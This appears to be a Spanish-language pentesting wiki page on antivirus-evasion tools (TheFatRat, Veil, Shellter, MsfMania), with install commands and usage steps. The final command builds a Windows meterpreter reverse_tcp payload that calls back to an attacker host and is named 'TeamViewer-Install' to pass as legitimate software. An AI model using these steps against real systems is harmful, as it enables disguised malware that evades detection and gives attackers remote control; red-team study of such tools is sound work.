
# Herramientas de Evasión

## <mark style="color:purple;">TheFatRat</mark>

TheFatRat es una potente herramienta de generación de payloads y explotación diseñada para simplificar y automatizar la creación de malware y la realización de ataques en diversos sistemas. Aplica distintas técnicas para cifrar los payloads y así eludir los antivirus.

{% embed url="<https://github.com/screetsec/TheFatRat>" %}

<figure><img src="/files/hf8hGTGNdXb87siHFPjR" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Veil Framework</mark>

Veil tiene como objetivo crear payloads que puedan evadir la detección de software antivirus y anti-malware. La herramienta utiliza técnicas de ofuscación de código para evitar la detección de software antivirus y anti-malware. También puede generar payloads para diferentes tipos de ataque, como Reverse Shell, Meterpreter y PowerShell.

{% hint style="warning" %}
**Nota**: Como lleva tiempo sin actualizarse, la mayoría de binarios que crea posiblemente sean detectados por los antivirus modernos.
{% endhint %}

{% embed url="<https://github.com/Veil-Framework/Veil>" %}

```bash
sudo apt install veil
sudo veil
```

1. Selecciona el tipo de payload (`Evasion`)
2. Elige el lenguaje (Python, C, etc.)
3. Configura el payload (`reverse_tcp`, etc.)
4. Genera el `.exe`

***

## <mark style="color:purple;">Shellter</mark>

Shellter utiliza la técnica de inyección de código en tiempo de ejecución para ocultar los payloads maliciosos dentro de archivos ejecutables legítimos. La herramienta tiene como objetivo evadir la detección de software antivirus y anti-malware mediante la modificación de la memoria del proceso en tiempo de ejecución. Esto permite a los payloads maliciosos ejecutarse sin ser detectados por el software antivirus y anti-malware.

Viene instalada por defecto en kali Linux

{% embed url="<https://github.com/ParrotSec/shellter>" %}

#### Instalación y uso

```bash
sudo apt-get update
sudo apt-get install wine
wget https://www.shellterproject.com/Downloads/Shellter/Latest/shellter.zip
unzip shellter.zip
cd shellter
wine shellter.exe
```

***

## <mark style="color:purple;">MSFMania</mark>

MsfMania es una herramienta de línea de comandos desarrollada en Python que está diseñada para eludir el software antivirus en Windows y Linux/Mac en el futuro.

{% hint style="success" %}
Es poco conocida así que puede funcionar bien
{% endhint %}

{% embed url="<https://github.com/G1ft3dC0d3/MsfMania>" %}

<figure><img src="/files/dscuV89E8yT1Tq8EmBZz" alt=""><figcaption></figcaption></figure>

#### Instalación y uso

```bash
git clone https://github.com/G1ft3dC0d3/MsfMania.git
cd MsfMania
python3 MsfMania.py -h
```

#### Ejemplo de payload para Windows

```bash
python3 MsFmania.py -a x64 -p windows/x64/meterpreter/reverse_tcp -lh 192.168.1.26 -lp 4443 -o TeamViewer-Install -it local --hash md5
```
